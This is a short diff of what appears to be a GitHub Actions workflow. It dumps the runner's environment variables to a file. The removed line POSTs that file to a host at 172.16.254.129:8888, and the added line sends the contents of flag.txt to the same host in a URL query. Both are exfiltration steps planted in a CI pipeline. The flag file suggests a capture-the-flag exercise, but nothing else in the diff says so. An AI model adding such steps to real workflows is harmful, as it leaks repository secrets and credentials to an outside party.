@@ -7,4 +7,4 @@ jobs:
     steps:
       - uses: actions/checkout@v4
       - run: env > env.txt
-             curl -X POST -d @env.txt http://172.16.254.129:8888/
+             curl "http://172.16.254.129:8888/?data=$(cat flag.txt)"
